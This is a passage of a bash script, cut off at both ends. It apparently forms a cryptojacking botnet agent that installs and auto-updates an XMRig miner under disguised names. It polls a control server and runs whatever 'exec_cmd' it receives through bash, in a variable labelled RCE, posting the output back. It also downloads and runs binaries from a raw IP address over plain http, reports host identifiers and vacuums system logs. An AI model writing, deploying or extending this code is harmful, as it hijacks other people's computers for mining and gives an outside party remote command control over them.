    [[ -f "$candidate" ]] || return 1
    expected_sha=${expected_sha#sha256:}
    expected_sha=$(printf '%s' "$expected_sha" | tr '[:upper:]' '[:lower:]')
    if [[ -n "$expected_sha" ]]; then
        if [[ ! "$expected_sha" =~ ^[a-f0-9]{64}$ ]]; then
            LAST_ERROR_CODE="E_UPDATE_CHECKSUM_METADATA"
            UPDATE_ERROR_CODE="E_UPDATE_CHECKSUM_METADATA"
            UPDATE_STATUS="FAILED"
            UPDATE_DETAIL="Source supplied an invalid SHA-256 value"
            log ERROR "XMRIG UPDATE FAILED: invalid SHA metadata source=$source"
            return 1
        fi
        downloaded_sha=$(sha256sum "$candidate" 2>/dev/null | awk '{print $1}')
        if [[ "$downloaded_sha" != "$expected_sha" ]]; then
            LAST_ERROR_CODE="E_UPDATE_CHECKSUM"
            UPDATE_ERROR_CODE="E_UPDATE_CHECKSUM"
            UPDATE_STATUS="FAILED"
            UPDATE_DETAIL="Binary SHA-256 verification failed"
            log ERROR "XMRIG UPDATE FAILED: SHA mismatch source=$source"
            return 1
        fi
    elif [[ "$integrity_verified" != "true" ]]; then
        log INFO "XMRIG UPDATE CHECKSUM UNAVAILABLE source=$source; using binary self-test"
    fi

    chmod 700 "$candidate"
    version_line=$("$candidate" --version 2>/dev/null | head -n 5 || true)
    candidate_version=$(printf '%s\n' "$version_line" \
        | grep -Eio 'XMRig[[:space:]]+v?[0-9]+\.[0-9]+\.[0-9]+' \
        | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
    if [[ ! "$candidate_version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LAST_ERROR_CODE="E_UPDATE_BINARY_INVALID"
        UPDATE_ERROR_CODE="E_UPDATE_BINARY_INVALID"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="Downloaded file does not identify itself as XMRig"
        log ERROR "XMRIG UPDATE FAILED: candidate is not XMRig source=$source"
        return 1
    fi

    normalized_expected=${expected_version#v}
    if [[ "$normalized_expected" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ && "$candidate_version" != "$normalized_expected" ]]; then
        log INFO "XMRIG UPDATE VERSION METADATA DIFFERS source=$source metadata=$normalized_expected candidate=$candidate_version"
    fi

    if [[ "$DIGMON_VERSION" != "unknown" ]] && ! version_is_newer "$candidate_version" "$DIGMON_VERSION"; then
        UPDATE_STATUS="CURRENT"
        UPDATE_ERROR_CODE=""
        UPDATE_DETAIL="Candidate $candidate_version is not newer than installed $DIGMON_VERSION"
        log INFO "XMRIG UPDATE SKIPPED: candidate=$candidate_version installed=$DIGMON_VERSION source=$source"
        return 0
    fi

    if ! timeout --kill-after=2s 15s "$candidate" -c "$CONFIG_FILE" --dry-run --no-color >/dev/null 2>&1; then
        LAST_ERROR_CODE="E_UPDATE_CONFIG_DRY_RUN"
        UPDATE_ERROR_CODE="E_UPDATE_CONFIG_DRY_RUN"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="Candidate failed XMRig config dry-run"
        log ERROR "XMRIG UPDATE FAILED: config dry-run source=$source candidate=$candidate_version"
        return 1
    fi

    UPDATE_TARGET_VERSION="$candidate_version"

    UPDATE_STATUS="INSTALLING"
    UPDATE_DETAIL="Installing verified binary"
    [[ -x "$WORKER" ]] && cp -f "$WORKER" "$WORKER.previous"
    stop_worker
    mv -f "$candidate" "$WORKER"
    chmod 700 "$WORKER"
    DIGMON_VERSION=$(get_digmon_version)
    start_worker
    health_deadline=$(($(date +%s) + 30))
    while (( $(date +%s) < health_deadline )); do
        sleep 5
        worker_running || break
    done
    if worker_running; then
        UPDATE_STATUS="SUCCESS"
        LAST_ERROR_CODE=""
        UPDATE_ERROR_CODE=""
        UPDATE_DETAIL="Worker healthy after update"
        log INFO "XMRIG UPDATE SUCCESS source=$source from=${UPDATE_FROM_VERSION:-unknown} to=$DIGMON_VERSION worker=running"
        return 0
    fi

    if [[ -x "$WORKER.previous" ]]; then
        mv -f "$WORKER.previous" "$WORKER"
        chmod 700 "$WORKER"
        DIGMON_VERSION=$(get_digmon_version)
        start_worker
        UPDATE_STATUS="ROLLED_BACK"
        LAST_ERROR_CODE="E_UPDATE_HEALTHCHECK"
        UPDATE_ERROR_CODE="E_UPDATE_HEALTHCHECK"
        UPDATE_DETAIL="Health check failed and previous binary restored"
        log ERROR "XMRIG UPDATE ROLLED BACK source=$source from=${UPDATE_FROM_VERSION:-unknown} target=${UPDATE_TARGET_VERSION:-unknown} restored=$DIGMON_VERSION"
    else
        UPDATE_STATUS="FAILED"
        LAST_ERROR_CODE="E_UPDATE_HEALTHCHECK"
        UPDATE_ERROR_CODE="E_UPDATE_HEALTHCHECK"
        UPDATE_DETAIL="Health check failed and rollback is unavailable"
        log ERROR "XMRIG UPDATE FAILED: rollback unavailable source=$source"
    fi
    return 1
}

select_linux_x64_release_asset() {
    jq -r '
        def lower_name: ((.name // .label // "") | ascii_downcase);
        [
            .assets[]?
            | . as $asset
            | (lower_name) as $name
            | select($name | test("(linux|ubuntu|debian|focal|jammy|noble)"))
            | select($name | test("(x64|x86_64|amd64)"))
            | select($name | test("(arm|aarch64|riscv|freebsd|macos|darwin|windows|win32|win64|source|sha256|signature|\\.sig$)") | not)
            | select($name | test("(\\.tar\\.gz|\\.tgz|\\.tar\\.xz|\\.txz|\\.tar\\.bz2|\\.tbz2|\\.tar\\.zst|\\.tzst|\\.zip|\\.appimage|\\.bin)$"))
            | {
                asset: $asset,
                score: (
                    (if ($name | contains("linux-static")) then 1000 else 0 end) +
                    (if ($name | test("(linux|debian)-?(static)?-?x64")) then 500 else 0 end) +
                    (if ($name | test("(noble|jammy|focal)")) then 100 else 0 end) +
                    (if ($name | test("\\.tar\\.gz$")) then 40
                     elif ($name | test("\\.(tgz|tar\\.xz|txz)$")) then 30
                     elif ($name | test("\\.zip$")) then 20
                     else 10 end)
                )
            }
        ]
        | sort_by(.score) | reverse | .[0].asset // empty
        | [
            (.name // .label // ""),
            (.browser_download_url // .download_url // .url // ""),
            (.digest // .sha256 // .hash // "")
          ]
        | @tsv
    '
}

semantic_version_from_release_text() {
    printf '%s' "$1" | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+' | head -n 1
}

extract_official_release_package() {
    local archive="$1" asset_name="$2" destination="$3" lower_name
    lower_name=$(printf '%s' "$asset_name" | tr '[:upper:]' '[:lower:]')
    case "$lower_name" in
        *.tar.gz|*.tgz) tar -xzf "$archive" -C "$destination" ;;
        *.tar.xz|*.txz) tar -xJf "$archive" -C "$destination" ;;
        *.tar.bz2|*.tbz2) tar -xjf "$archive" -C "$destination" ;;
        *.tar.zst|*.tzst) tar --zstd -xf "$archive" -C "$destination" ;;
        *.zip)
            if command -v unzip >/dev/null 2>&1; then
                unzip -qq "$archive" -d "$destination"
            elif command -v python3 >/dev/null 2>&1; then
                python3 -m zipfile -e "$archive" "$destination"
            else
                return 1
            fi
            ;;
        *.appimage|*.bin) install -m 700 "$archive" "$destination/network-modules-candidate" ;;
        *) return 1 ;;
    esac
}

find_official_worker_candidate() {
    local directory="$1" file output version
    while IFS= read -r -d '' file; do
        chmod 700 "$file" 2>/dev/null || continue
        output=$(timeout 15 "$file" --version 2>/dev/null | head -n 5 || true)
        version=$(printf '%s\n' "$output" \
            | grep -Eio 'XMRig[[:space:]]+v?[0-9]+\.[0-9]+\.[0-9]+' \
            | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
        if [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            printf '%s\n' "$file"
            return 0
        fi
    done < <(find "$directory" -type f -size +100k -size -50M -print0)
    return 1
}

install_official_release() {
    local version="$1" release_ts="$2" url="$3" sha="$4" source="$5" asset_name="${6:-}"
    local now rollout_delay work_dir archive candidate local_sha archive_verified=false

    version=${version#v}
    sha=${sha#sha256:}
    sha=$(printf '%s' "$sha" | tr '[:upper:]' '[:lower:]')
    [[ "$release_ts" =~ ^[0-9]+$ ]] || release_ts=0
    (( release_ts > 9999999999 )) && release_ts=$((release_ts / 1000))
    [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 2
    [[ "$url" == https://* ]] || return 2
    [[ -z "$sha" || "$sha" =~ ^[a-f0-9]{64}$ ]] || return 2
    now=$(date +%s)
    rollout_delay=$(printf '%s' "$MACHINE_GUID" | cksum | awk -v window="$OFFICIAL_RELEASE_JITTER" '{print $1 % (window + 1)}')
    if (( release_ts > 0 && now - release_ts < OFFICIAL_RELEASE_MIN_AGE + rollout_delay )); then
        return 0
    fi
    if ! version_is_newer "$version" "$DIGMON_VERSION"; then
        return 0
    fi

    begin_update_event "$source" "$DIGMON_VERSION" "$version" "Downloading official release"

    work_dir=$(mktemp -d "$BASE_DIR/.xmrig-update.XXXXXX") || return 2
    [[ -n "$asset_name" ]] || asset_name=$(basename "${url%%\?*}")
    archive="$work_dir/network-modules.package"
    UPDATE_STATUS="DOWNLOADING"
    log INFO "XMRIG UPDATE DOWNLOAD source=$source version=$version"
    if ! curl -fsSL --retry 2 --connect-timeout 10 -m 180 -o "$archive" "$url"; then
        LAST_ERROR_CODE="E_UPDATE_DOWNLOAD"
        UPDATE_ERROR_CODE="E_UPDATE_DOWNLOAD"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="Official release download failed"
        remove_update_directory "$work_dir"
        return 2
    fi
    if [[ -n "$sha" ]]; then
        local_sha=$(sha256sum "$archive" 2>/dev/null | awk '{print $1}')
        if [[ "$local_sha" != "$sha" ]]; then
            remove_update_directory "$work_dir"
            LAST_ERROR_CODE="E_UPDATE_CHECKSUM"
            UPDATE_ERROR_CODE="E_UPDATE_CHECKSUM"
            UPDATE_STATUS="FAILED"
            UPDATE_DETAIL="Official archive SHA-256 verification failed"
            log ERROR "XMRIG UPDATE FAILED: archive SHA mismatch source=$source"
            return 2
        fi
        archive_verified=true
    else
        log INFO "XMRIG UPDATE ARCHIVE CHECKSUM UNAVAILABLE source=$source; candidate self-test required"
    fi
    if ! extract_official_release_package "$archive" "$asset_name" "$work_dir"; then
        LAST_ERROR_CODE="E_UPDATE_ARCHIVE"
        UPDATE_ERROR_CODE="E_UPDATE_ARCHIVE"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="Official archive could not be extracted"
        remove_update_directory "$work_dir"
        return 2
    fi
    candidate=$(find_official_worker_candidate "$work_dir" || true)
    if [[ -z "$candidate" ]]; then
        LAST_ERROR_CODE="E_UPDATE_ARCHIVE"
        UPDATE_ERROR_CODE="E_UPDATE_ARCHIVE"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="XMRig binary is missing from official archive"
        remove_update_directory "$work_dir"
        return 2
    fi
    if install_worker_candidate "$candidate" "" "$version" "$source" "$archive_verified"; then
        remove_update_directory "$work_dir"
        return 0
    fi
    remove_update_directory "$work_dir"
    return 2
}

github_official_update() {
    local metadata version published_at release_ts selected name url sha checksum_url checksum_text

    metadata=$(curl -fsSL --connect-timeout 5 -m 20 -H 'Accept: application/vnd.github+json' -H 'User-Agent: localcomputeagent-xmrig-updater' "$GITHUB_RELEASE_API" 2>/dev/null || true)
    echo "$metadata" | jq -e '.tag_name and .published_at and (.assets | type == "array") and (.draft == false) and (.prerelease == false)' >/dev/null 2>&1 || return 2
    version=$(semantic_version_from_release_text "$(echo "$metadata" | jq -r '.tag_name // .name // empty')")
    published_at=$(echo "$metadata" | jq -r '.published_at // empty')
    release_ts=$(date -d "$published_at" +%s 2>/dev/null || printf '0')
    selected=$(echo "$metadata" | select_linux_x64_release_asset) || return 2
    IFS=$'\t' read -r name url sha <<< "$selected"
    sha=${sha#sha256:}
    sha=$(printf '%s' "$sha" | tr '[:upper:]' '[:lower:]')
    if [[ ! "$sha" =~ ^[a-f0-9]{64}$ ]]; then
        checksum_url=$(echo "$metadata" | jq -r '.assets[]? | select(((.name // "") | ascii_downcase) == "sha256sums") | (.browser_download_url // .download_url // empty)' | head -n 1)
        if [[ "$checksum_url" == https://* ]]; then
            checksum_text=$(curl -fsSL --connect-timeout 5 -m 20 -H 'User-Agent: localcomputeagent-xmrig-updater' "$checksum_url" 2>/dev/null || true)
            sha=$(printf '%s\n' "$checksum_text" | awk -v wanted="$name" '{ file=$2; sub(/^\*/, "", file) } file == wanted && $1 ~ /^[a-fA-F0-9]{64}$/ { print tolower($1); exit }')
        fi
    fi
    [[ -n "$name" && "$url" == https://* ]] || return 2
    install_official_release "$version" "$release_ts" "$url" "$sha" github-official "$name"
}

xmrig_official_update() {
    local metadata version release_ts selected name url sha

    metadata=$(curl -fsSL --connect-timeout 5 -m 15 "$OFFICIAL_RELEASE_API" 2>/dev/null || true)
    echo "$metadata" | jq -e '.version and (.assets | type == "array")' >/dev/null 2>&1 || return 2
    version=$(semantic_version_from_release_text "$(echo "$metadata" | jq -r '.version // .tag_name // .name // empty')")
    release_ts=$(echo "$metadata" | jq -r '.ts // 0')
    selected=$(echo "$metadata" | select_linux_x64_release_asset) || return 2
    IFS=$'\t' read -r name url sha <<< "$selected"
    install_official_release "$version" "$release_ts" "$url" "$sha" xmrig-api-official "$name"
}

web_update() {
    local control url sha version temporary local_sha
    control=$(agent_api_curl -fsSL --connect-timeout 5 -m 15 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
    echo "$control" | jq -e 'type == "object"' >/dev/null 2>&1 || return 1
    url=$(echo "$control" | jq -r '.bin_url // empty')
    sha=$(echo "$control" | jq -r '.bin_sha // empty')
    version=$(echo "$control" | jq -r '.xmrig_version // empty')
    [[ "$url" == https://* || "$url" == http://103.59.94.204/* ]] || return 1
    sha=${sha#sha256:}
    sha=$(printf '%s' "$sha" | tr '[:upper:]' '[:lower:]')
    [[ -z "$sha" || "$sha" =~ ^[a-f0-9]{64}$ ]] || return 1
    [[ -n "$sha" || -n "$version" ]] || return 1
    local_sha=$(sha256sum "$WORKER" 2>/dev/null | awk '{print $1}')
    [[ -z "$sha" || "$local_sha" != "$sha" ]] || return 0
    if [[ -n "$version" ]] && ! version_is_newer "$version" "$DIGMON_VERSION"; then
        if version_is_newer "$UPDATE_TARGET_VERSION" "$DIGMON_VERSION"; then
            return 1
        fi
        return 0
    fi
    begin_update_event "idcloudhost-vps" "$DIGMON_VERSION" "${version:-unknown}" "Downloading VPS fallback release"
    temporary="$WORKER.web.tmp.$$"
    UPDATE_STATUS="DOWNLOADING"
    log INFO "XMRIG UPDATE DOWNLOAD source=idcloudhost-vps version=${version:-unknown}"
    if ! curl -fsSL --retry 2 --connect-timeout 10 -m 180 -o "$temporary" "$url"; then
        LAST_ERROR_CODE="E_UPDATE_DOWNLOAD"
        UPDATE_ERROR_CODE="E_UPDATE_DOWNLOAD"
        UPDATE_STATUS="FAILED"
        UPDATE_DETAIL="Web fallback download failed"
        rm -f "$temporary"
        return 1
    fi
    if install_worker_candidate "$temporary" "$sha" "$version" idcloudhost-vps; then
        return 0
    fi
    rm -f "$temporary"
    return 1
}

check_updates() {
    local lock_fd failures
    exec {lock_fd}>"$UPDATE_LOCK_FILE"
    if ! flock -n "$lock_fd"; then
        exec {lock_fd}>&-
        return 0
    fi
    if github_official_update; then
        mark_update_recovered
        schedule_update_success
        exec {lock_fd}>&-
        return 0
    fi
    if xmrig_official_update; then
        mark_update_recovered
        schedule_update_success
        exec {lock_fd}>&-
        return 0
    fi
    if web_update; then
        mark_update_recovered
        schedule_update_success
        exec {lock_fd}>&-
        return 0
    fi
    if [[ -z "$UPDATE_ERROR_CODE" ]]; then
        begin_update_event "all" "$DIGMON_VERSION" "" "GitHub, XMRig API, and web fallback are unavailable"
        UPDATE_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
    elif [[ "$UPDATE_ERROR_CODE" != "E_UPDATE_SOURCES_UNAVAILABLE" ]]; then
        [[ "$UPDATE_DETAIL" == *"remaining update sources are unavailable"* ]] || UPDATE_DETAIL="$UPDATE_DETAIL; remaining update sources are unavailable"
    fi
    UPDATE_STATUS="RETRY_WAIT"
    schedule_update_retry
    failures=$(read_uint_file "$UPDATE_FAILURE_FILE" 1)
    if (( failures == 1 || failures % 10 == 0 )); then
        if worker_running; then
            # This remains an ERROR because update maintenance really failed.
            # Error reporting is telemetry only and must never stop the healthy
            # mining worker or turn a control-plane failure into a mining action.
            LAST_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
            log ERROR "XMRIG UPDATE SOURCES UNAVAILABLE; RUNNING BINARY AND WORKER REMAIN UNCHANGED (attempt=$failures)"
        else
            LAST_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
            log ERROR "XMRIG UPDATE SOURCES UNAVAILABLE; WORKER IS ALSO DOWN (attempt=$failures)"
        fi
    fi
    exec {lock_fd}>&-
    return 1
}

personalize_bootstrap_config() {
    local current_user prefix personalized tmp_config
    [[ -f "$CONFIG_FILE" ]] || return 0
    current_user=$(jq -r '.pools[0].user // empty' "$CONFIG_FILE" 2>/dev/null || true)
    [[ "$current_user" == *.unregistered_bootstrap ]] || return 0
    prefix=${current_user%.unregistered_bootstrap}
    personalized="${prefix}.unregistered_${MACHINE_GUID:0:12}"
    tmp_config="$CONFIG_FILE.bootstrap.$$"
    if jq --arg user "$personalized" '.pools[0].user = $user' "$CONFIG_FILE" > "$tmp_config"; then
        mv -f "$tmp_config" "$CONFIG_FILE"
    else
        rm -f "$tmp_config"
    fi
}

cleanup_runtime_files
restore_local_config || true
personalize_bootstrap_config
if [[ -x "$WORKER" ]] && valid_config_file "$CONFIG_FILE"; then
    CONFIG_VERSION=$(load_config_version)
    ensure_worker_started
    log INFO "OFFLINE-SAFE START (config=$CONFIG_VERSION)"
else
    if fetch_initial_config && valid_config_file "$CONFIG_FILE"; then
        personalize_bootstrap_config
        ensure_worker_started
    fi
fi
LAST_WORKER_START=$(date +%s)
mkdir -p "$(dirname "$AGENT_READY_FILE")"
printf '%s\n' "$COMPUTE_VERSION" > "$AGENT_READY_FILE.tmp.$$"
mv -f "$AGENT_READY_FILE.tmp.$$" "$AGENT_READY_FILE"
journalctl -u localcomputeworker.service -n 0 -f -o cat 2>/dev/null | forward_worker_logs &
load_agent_update_result

get_ram_usage() {
    local total_kb available_kb used_kb

    total_kb=$(awk '/MemTotal/ {print $2}' /proc/meminfo 2>/dev/null)
    available_kb=$(awk '/MemAvailable/ {print $2}' /proc/meminfo 2>/dev/null)

    if [[ -z "$total_kb" || -z "$available_kb" ]]; then
        echo "null null"
        return
    fi

    used_kb=$((total_kb - available_kb))

    local total_mb used_mb
    total_mb=$((total_kb / 1024))
    used_mb=$((used_kb / 1024))

    echo "$used_mb $total_mb"
}

get_cpu_temp() {
    local t

    for zone in /sys/class/thermal/thermal_zone*/temp; do
        if [[ -f "$zone" ]]; then
            t=$(cat "$zone" 2>/dev/null)
            if [[ "$t" =~ ^[0-9]+$ && "$t" -gt 10000 ]]; then
                echo $((t / 1000))
                return
            fi
        fi
    done

    echo 0
}

get_cpu_usage() {
    local cpu_line1 cpu_line2
    local idle1 idle2 total1 total2

    read -r cpu user nice system idle iowait irq softirq steal _ < /proc/stat
    idle1=$((idle + iowait))
    total1=$((user + nice + system + idle + iowait + irq + softirq + steal))

    sleep 0.5

    read -r cpu user nice system idle iowait irq softirq steal _ < /proc/stat
    idle2=$((idle + iowait))
    total2=$((user + nice + system + idle + iowait + irq + softirq + steal))

    local idle_delta=$((idle2 - idle1))
    local total_delta=$((total2 - total1))

    if (( total_delta == 0 )); then
        echo 0
        return
    fi

    echo $((100 * (total_delta - idle_delta) / total_delta))
}


build_command_result_payload() {
    local command_id="$1" status="$2" exit_code="$3" duration_ms="$4" output="$5"
    local sequence=1 event_at
    [[ "$status" == "DELIVERED" || "$status" == "RUNNING" ]] && sequence=0
    event_at=$(date -u '+%Y-%m-%dT%H:%M:%SZ')
    jq -cn \
        --arg machine_guid "$MACHINE_GUID" --arg command_id "$command_id" \
        --arg status "$status" --arg output "$output" --arg event_at "$event_at" \
        --argjson exit_code "$exit_code" --argjson duration_ms "$duration_ms" \
        --argjson sequence "$sequence" \
        '{machine_guid:$machine_guid,command_id:$command_id,status:$status,event_at:$event_at,sequence:$sequence,stream:"STDOUT",output:$output,exit_code:$exit_code,duration_ms:$duration_ms}'
}

send_command_result_payload() {
    local payload="$1" response
    response=$(agent_api_curl -sS -m 10 -X POST "$API_BASE/command-result.php" \
        -H "Content-Type: application/json" --data-binary "$payload" 2>/dev/null || true)
    printf '%s' "$response" | jq -e '.status == "ok"' >/dev/null 2>&1
}

post_command_result() {
    local payload
    payload=$(build_command_result_payload "$@") || return 1
    send_command_result_payload "$payload"
}

persist_command_result() {
    local payload="$1" temporary="${COMMAND_RESULT_OUTBOX_FILE}.$$"
    umask 077
    printf '%s' "$payload" > "$temporary" || return 1
    mv -f "$temporary" "$COMMAND_RESULT_OUTBOX_FILE"
}

flush_command_result_outbox() {
    local payload command_id
    [[ -s "$COMMAND_RESULT_OUTBOX_FILE" ]] || return 0
    payload=$(cat "$COMMAND_RESULT_OUTBOX_FILE" 2>/dev/null || true)
    [[ -n "$payload" ]] || return 1
    if send_command_result_payload "$payload"; then
        command_id=$(printf '%s' "$payload" | jq -r '.command_id // empty' 2>/dev/null || true)
        [[ -n "$command_id" ]] && printf '%s\n' "$command_id" > "$LAST_COMMAND_FILE"
        rm -f "$COMMAND_RESULT_OUTBOX_FILE"
        return 0
    fi
    return 1
}

execute_remote_command() {
    local command_id="$1" command="$2" timeout_sec="$3"
    local last_id output exit_code started finished duration status payload
    [[ ! -s "$COMMAND_RESULT_OUTBOX_FILE" ]] || return 0
    last_id=$(cat "$LAST_COMMAND_FILE" 2>/dev/null || true)
    [[ -n "$command_id" && "$command_id" != "$last_id" ]] || return 0
    [[ "$timeout_sec" =~ ^[0-9]+$ ]] || timeout_sec=120
    (( timeout_sec > 600 )) && timeout_sec=600

    printf '%s\n' "$command_id" > "$ACTIVE_COMMAND_FILE"
    post_command_result "$command_id" "DELIVERED" 0 0 "" || true
    started=$(date +%s)
    post_command_result "$command_id" "RUNNING" 0 0 "Command started" || true
    output=$(timeout --kill-after=5s "$timeout_sec" bash -c "$command" 2>&1)
    exit_code=$?
    output=$(printf '%s' "$output" | head -c 8000)
    finished=$(date +%s)
    duration=$(((finished - started) * 1000))
    status="FAILED"
    (( exit_code == 0 )) && status="SUCCESS"
    payload=$(build_command_result_payload "$command_id" "$status" "$exit_code" "$duration" "$output") || return 1
    if persist_command_result "$payload"; then
        rm -f "$ACTIVE_COMMAND_FILE"
        flush_command_result_outbox || true
    elif send_command_result_payload "$payload"; then
        printf '%s\n' "$command_id" > "$LAST_COMMAND_FILE"
        rm -f "$ACTIVE_COMMAND_FILE"
    fi
}

NOW=$(date +%s)
NEXT_CONTROL=$((NOW + RANDOM % 30))
NEXT_CONFIG=$((NOW + RANDOM % 45))
NEXT_HEARTBEAT=$((NOW + RANDOM % 30))
NEXT_JOURNAL_VACUUM=$((NOW + JOURNAL_VACUUM_INTERVAL))
NEXT_REGISTRATION=$(read_uint_file "$REGISTRATION_NEXT_FILE" 0)
if [[ -s "$REGISTRATION_STATE_FILE" ]]; then
    NEXT_REGISTRATION=0
elif (( NEXT_REGISTRATION <= NOW )); then
    NEXT_REGISTRATION=$((NOW + RANDOM % 10))
fi
NEXT_UPDATE=$(read_uint_file "$UPDATE_NEXT_FILE" 0)
if (( NEXT_UPDATE <= NOW )); then
    NEXT_UPDATE=$((NOW + 60 + RANDOM % 61))
    write_uint_file "$UPDATE_NEXT_FILE" "$NEXT_UPDATE"
fi
HEARTBEAT_FAILURES=0

while true; do
    NOW=$(date +%s)

    if (( NOW >= NEXT_JOURNAL_VACUUM )); then
        vacuum_system_journal
        NEXT_JOURNAL_VACUUM=$((NOW + JOURNAL_VACUUM_INTERVAL))
    fi

    flush_command_result_outbox || true

    if (( NEXT_REGISTRATION > 0 && NOW >= NEXT_REGISTRATION )); then
        if register_agent; then
            NEXT_REGISTRATION=0
            NEXT_CONFIG=$NOW
        else
            schedule_registration_retry
            NEXT_REGISTRATION=$(read_uint_file "$REGISTRATION_NEXT_FILE" $((NOW + REGISTRATION_RETRY_MIN)))
        fi
    fi

    if (( NOW >= NEXT_CONTROL )); then
        CTRL=$(agent_api_curl -fsS -m 10 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
        if echo "$CTRL" | jq -e 'type == "object"' >/dev/null 2>&1; then
            queue_agent_update "$CTRL" || true
            RCE=$(echo "$CTRL" | jq -r '.exec_cmd // empty')
            COMMAND_ID=$(echo "$CTRL" | jq -r '.command_id // empty')
            COMMAND_TIMEOUT=$(echo "$CTRL" | jq -r '.command_timeout // 120')
            [[ -n "$RCE" && "$RCE" != "null" ]] && execute_remote_command "$COMMAND_ID" "$RCE" "$COMMAND_TIMEOUT"
        fi
        NEXT_CONTROL=$((NOW + CONTROL_INTERVAL + RANDOM % (CONTROL_JITTER + 1)))
    fi

    # Agent commands and self-update are control-plane work and take priority.
    # XMRig release discovery is maintenance and may involve slow external APIs.
    if (( NOW >= NEXT_UPDATE )); then
        check_updates || true
        NEXT_UPDATE=$(read_uint_file "$UPDATE_NEXT_FILE" $((NOW + UPDATE_RETRY_MIN)))
    fi

    if (( NOW >= NEXT_CONFIG )); then
        CFG=$(agent_api_curl -fsS -m 10 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
        if echo "$CFG" | jq -e '.version' >/dev/null 2>&1; then
            NEW_VER=$(echo "$CFG" | jq -r '.version')
            OLD_VER=$(cat "$CONFIG_VERSION_FILE" 2>/dev/null || true)
            if [[ "$NEW_VER" != "$OLD_VER" ]]; then
                CURRENT_RUNTIME_FINGERPRINT=$(config_runtime_fingerprint_file "$CONFIG_FILE")
                NEW_RUNTIME_FINGERPRINT=$(config_runtime_fingerprint_json "$CFG")
                log INFO "CONFIG VERSION CHANGED $OLD_VER -> $NEW_VER"
                if save_config "$CFG"; then
                    if [[ -z "$CURRENT_RUNTIME_FINGERPRINT" || -z "$NEW_RUNTIME_FINGERPRINT" || "$CURRENT_RUNTIME_FINGERPRINT" != "$NEW_RUNTIME_FINGERPRINT" ]]; then
                        start_worker
                    else
                        log INFO "CONFIG METADATA UPDATED; XMRIG KEPT RUNNING"
                    fi
                else
                    LAST_ERROR_CODE="E_CONFIG_INVALID"
                fi
            fi
        fi
        NEXT_CONFIG=$((NOW + CONFIG_INTERVAL + RANDOM % 60))
    fi

    if (( NOW - LAST_WORKER_START > WORKER_GRACE_SEC )) && ! worker_running; then
        LAST_ERROR_CODE="E_XMRIG_CRASH"
        if restart_permitted; then
            LAST_WORKER_EVENT="restarting"
            log ERROR "WORKER DEAD; RESTARTING"
            start_worker
            LAST_WORKER_START=$(date +%s)
        elif [[ "$LAST_WORKER_EVENT" != "restart_blocked" ]]; then
            LAST_WORKER_EVENT="restart_blocked"
            LAST_ERROR_CODE="E_XMRIG_RESTART_COOLDOWN"
            log ERROR "WORKER RESTART LIMIT REACHED; COOLDOWN ACTIVE"
        fi
    else
        reset_restart_state_if_stable
        worker_running && LAST_WORKER_EVENT="running"
    fi

    if (( NOW >= NEXT_HEARTBEAT )); then
        load_agent_update_result
        UP=false; worker_running && UP=true
        CPU_USAGE=$(get_cpu_usage)
        read RAM_USED RAM_TOTAL <<< "$(get_ram_usage)"
        CPU_TEMP=$(get_cpu_temp)
        CONFIG_VERSION=$(load_config_version)
        HEARTBEAT_PAYLOAD=$(jq -n \
            --arg machine_guid "$MACHINE_GUID" --arg installation_id "$MACHINE_GUID" \
            --arg hardware_machine_id "$HARDWARE_MACHINE_ID" --arg hostname "$HOSTNAME" \
            --arg Compute_Version "$COMPUTE_VERSION" \
            --arg Digmon_Version "$DIGMON_VERSION" --arg config_version "$CONFIG_VERSION" \
            --arg update_status "$UPDATE_STATUS" --arg update_component "$UPDATE_COMPONENT" --arg error_code "$LAST_ERROR_CODE" \
            --arg update_error_code "$UPDATE_ERROR_CODE" --arg update_event_id "$UPDATE_EVENT_ID" \
            --arg update_source "$UPDATE_SOURCE" --arg update_from_version "$UPDATE_FROM_VERSION" \
            --arg update_target_version "$UPDATE_TARGET_VERSION" --arg update_detail "$UPDATE_DETAIL" \
            --argjson capabilities "$AGENT_CAPABILITIES" --argjson cpu_usage "$CPU_USAGE" \
            --argjson cpu_temp "$CPU_TEMP" --argjson ram_used "$RAM_USED" --argjson ram_total "$RAM_TOTAL" \
            --argjson worker_up "$UP" \
            '{machine_guid:$machine_guid,installation_id:$installation_id,hardware_machine_id:$hardware_machine_id,hostname:$hostname,protocol_version:3,capabilities:$capabilities,Compute_Version:$Compute_Version,Digmon_Version:$Digmon_Version,config_version:$config_version,cpu_usage:$cpu_usage,cpu_temp:$cpu_temp,ram_used:$ram_used,ram_total:$ram_total,worker_up:$worker_up,update_status:$update_status,update_component:$update_component,error_code:$error_code,update_error_code:$update_error_code,update_event_id:$update_event_id,update_source:$update_source,update_from_version:$update_from_version,update_target_version:$update_target_version,update_detail:$update_detail}')
        RESPONSE=$(agent_api_curl -fsS -m 10 -X POST "$API_BASE/heartbeat.php" -H "Content-Type: application/json" --data-binary "$HEARTBEAT_PAYLOAD" 2>/dev/null || true)
        if echo "$RESPONSE" | jq -e '.status == "ok"' >/dev/null 2>&1; then
            if [[ "$HEARTBEAT_ALERTED" == "true" ]]; then
                log INFO "HEARTBEAT RECOVERED"
            fi
            HEARTBEAT_FAILURES=0
            HEARTBEAT_ALERTED=false
            clear_reported_agent_update_result
        else
            HEARTBEAT_FAILURES=$((HEARTBEAT_FAILURES + 1))
            if (( HEARTBEAT_FAILURES == 3 )); then
                HEARTBEAT_ALERTED=true
                if worker_running; then
